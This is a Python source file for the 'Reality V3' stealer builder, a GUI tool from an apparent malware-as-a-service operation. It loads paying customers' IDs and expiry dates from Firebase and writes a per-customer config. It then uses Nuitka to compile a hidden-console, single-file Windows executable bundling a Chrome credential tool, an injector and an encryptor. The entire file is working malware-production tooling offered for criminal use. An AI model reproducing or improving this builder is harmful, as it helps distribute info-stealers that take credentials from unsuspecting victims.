# builder.py - Reality V3 Stealer Builder

import os
import sys
import subprocess
import threading
import requests
from datetime import datetime
import customtkinter as ctk
from tkinter import messagebox, scrolledtext
from firebase_config import FIREBASE_CONFIG

DATABASE_URL = FIREBASE_CONFIG['databaseURL']

class BuilderGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Reality V3")
        self.root.geometry("800x700")
        
        # Dark theme
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("green")
        
        # Header
        header = ctk.CTkLabel(root, text="RealityV3 2026425", 
                             font=("Arial", 24, "bold"), text_color="#00ff00")
        header.pack(pady=20)
        
        # User Selection Frame
        user_frame = ctk.CTkFrame(root, fg_color="#2d2d2d")
        user_frame.pack(padx=20, pady=10, fill="x")
        
        ctk.CTkLabel(user_frame, text="Select User ID:", 
                    font=("Arial", 14, "bold")).grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        self.user_var = ctk.StringVar(value="Loading users...")
        self.user_dropdown = ctk.CTkComboBox(user_frame, variable=self.user_var, 
                                            width=400, state="readonly")
        self.user_dropdown.grid(row=0, column=1, padx=10, pady=10)
        
        refresh_btn = ctk.CTkButton(user_frame, text="🔄 Refresh", 
                                    command=self.load_users, width=100)
        refresh_btn.grid(row=0, column=2, padx=10, pady=10)
        
        # Build Settings Frame
        settings_frame = ctk.CTkFrame(root, fg_color="#2d2d2d")
        settings_frame.pack(padx=20, pady=10, fill="x")
        
        ctk.CTkLabel(settings_frame, text="Output Filename:", 
                    font=("Arial", 14, "bold")).grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        self.filename_var = ctk.StringVar(value="Reality_V3.exe")
        filename_entry = ctk.CTkEntry(settings_frame, textvariable=self.filename_var, width=400)
        filename_entry.grid(row=0, column=1, padx=10, pady=10)
        
        # Build Button
        self.build_btn = ctk.CTkButton(root, text="🔨 Build Stealer", 
                                      command=self.start_build,
                                      font=("Arial", 16, "bold"),
                                      height=50, fg_color="#00ff00", 
                                      text_color="#000000", hover_color="#00cc00")
        self.build_btn.pack(pady=20)
        
        # Progress Frame
        progress_frame = ctk.CTkFrame(root, fg_color="#2d2d2d")
        progress_frame.pack(padx=20, pady=10, fill="both", expand=True)
        
        ctk.CTkLabel(progress_frame, text="Build Output:", 
                    font=("Arial", 14, "bold")).pack(anchor="w", padx=10, pady=5)
        
        # Output text box
        self.output_text = ctk.CTkTextbox(progress_frame, width=750, height=300,
                                         font=("Consolas", 10))
        self.output_text.pack(padx=10, pady=10, fill="both", expand=True)
        
        # Status bar
        self.status_label = ctk.CTkLabel(root, text="Ready", 
                                        font=("Arial", 12), text_color="#00ff00")
        self.status_label.pack(pady=10)
        
        # Load users on startup
        self.load_users()
        self.users_dict = {}
    
    def log(self, message):
        """Add message to output box"""
        self.output_text.insert("end", f"{message}\n")
        self.output_text.see("end")
        self.root.update()
    
    def load_users(self):
        """Load users from Firebase"""
        self.log("Loading users from Firebase...")
        
        try:
            url = f"{DATABASE_URL}/users.json"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                users = response.json()
                
                if users:
                    self.users_dict = users
                    user_ids = list(users.keys())
                    
                    # Update dropdown
                    self.user_dropdown.configure(values=user_ids)
                    self.user_var.set(user_ids[0])
                    
                    self.log(f"✅ Loaded {len(user_ids)} users")
                else:
                    self.log("❌ No users found in database")
                    self.user_var.set("No users found")
            else:
                self.log(f"❌ Failed to load users: {response.status_code}")
                self.user_var.set("Error loading users")
        
        except Exception as e:
            self.log(f"❌ Error: {e}")
            self.user_var.set("Error loading users")
    
    def start_build(self):
        """Start build in separate thread"""
        selected_user = self.user_var.get()
        
        if selected_user == "Loading users..." or selected_user == "No users found" or selected_user == "Error loading users":
            messagebox.showerror("Error", "Please select a valid user!")
            return
        
        filename = self.filename_var.get().strip()
        if not filename:
            messagebox.showerror("Error", "Please enter a filename!")
            return
        
        if not filename.endswith('.exe'):
            filename += '.exe'
        
        # Disable build button
        self.build_btn.configure(state="disabled", text="Building...")
        self.status_label.configure(text="Building...", text_color="#ffff00")
        
        # Clear output
        self.output_text.delete("1.0", "end")
        
        # Start build thread
        build_thread = threading.Thread(target=self.build_stealer, 
                                       args=(selected_user, filename))
        build_thread.daemon = True
        build_thread.start()
    
    def build_stealer(self, user_id, filename):
        """Build the stealer with Nuitka"""
        try:
            self.log(f"🔨 Building stealer for user: {user_id}")
            self.log(f"📦 Output filename: {filename}")
            self.log("="*60)
            
            # Create builds directory
            builds_dir = "builds"
            os.makedirs(builds_dir, exist_ok=True)
            
            # Update config.py with selected USER_ID
            self.log("📝 Writing config.py with selected USER_ID...")
            
            config_content = f'''# config.py - Stealer configuration (MaaS version)

# Your unique user ID (from admin panel)
USER_ID = "{user_id}"

# Debug mode
DEBUG = False

# Paths
import os
import tempfile
LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')
TEMP = tempfile.gettempdir()

def log(msg):
    """Simple logging function"""
    if DEBUG:
        print(f"[DEBUGING RealityV3] {{msg}}")
'''
            
            with open('config.py', 'w') as f:
                f.write(config_content)
            
            self.log("✅ config.py updated")
            self.log("="*60)
            
            # Build with Nuitka
            self.log("🚀 Starting Nuitka compilation...")
            self.log("This may take 5-10 minutes...")
            self.log("="*60)
            
            output_path = os.path.join(builds_dir, filename)
            
            nuitka_cmd = [
                sys.executable, "-m", "nuitka",
                "--standalone",
                "--onefile",
                "--windows-disable-console",
                "--include-package=modules",  # Include modules package
                "--include-data-file=chromelevator_x64.exe=chromelevator_x64.exe",
                "--include-data-file=injector.py=injector.py",
                "--include-data-file=encryptor.exe=encryptor.exe",
                "--include-data-file=firebase_config.py=firebase_config.py",
                f"--output-filename={filename}",
                f"--output-dir={builds_dir}",
                "--assume-yes-for-downloads",  # Auto-accept any downloads Nuitka needs
                "main.py"
            ]
            
            # Run Nuitka
            process = subprocess.Popen(
                nuitka_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            # Stream output
            for line in process.stdout:
                self.log(line.rstrip())
            
            process.wait()
            
            if process.returncode == 0:
                self.log("="*60)
                self.log("✅ BUILD SUCCESSFUL!")
                self.log(f"📦 Output: {os.path.abspath(output_path)}")
                self.log(f"👤 User ID: {user_id}")
                self.log("="*60)
                
                # Get user info
                user_data = self.users_dict.get(user_id, {})
                expire_timestamp = user_data.get('expiration', 0)
                expire_date = datetime.fromtimestamp(expire_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                
                self.status_label.configure(text="Build Complete!", text_color="#00ff00")
                
                messagebox.showinfo("Build Successful!", 
                    f"✅ Stealer built successfully!\n\n"
                    f"User ID: {user_id}\n"
                    f"Expires: {expire_date}\n\n"
                    f"Output: {os.path.abspath(output_path)}\n\n"
                    f"⚠️ DO NOT RUN ON YOUR MACHINE!")
            else:
                self.log("="*60)
                self.log("❌ BUILD FAILED!")
                self.log(f"Return code: {process.returncode}")
                self.log("="*60)
                
                self.status_label.configure(text="Build Failed", text_color="#ff0000")
                messagebox.showerror("Build Failed", "Nuitka compilation failed! Check output for details.")
        
        except Exception as e:
            self.log("="*60)
            self.log(f"❌ ERROR: {e}")
            self.log("="*60)
            
            self.status_label.configure(text="Error", text_color="#ff0000")
            messagebox.showerror("Error", f"Build error: {e}")
        
        finally:
            # Re-enable build button
            self.build_btn.configure(state="normal", text="🔨 Build Stealer")

if __name__ == "__main__":
    root = ctk.CTk()
    app = BuilderGUI(root)
    root.mainloop()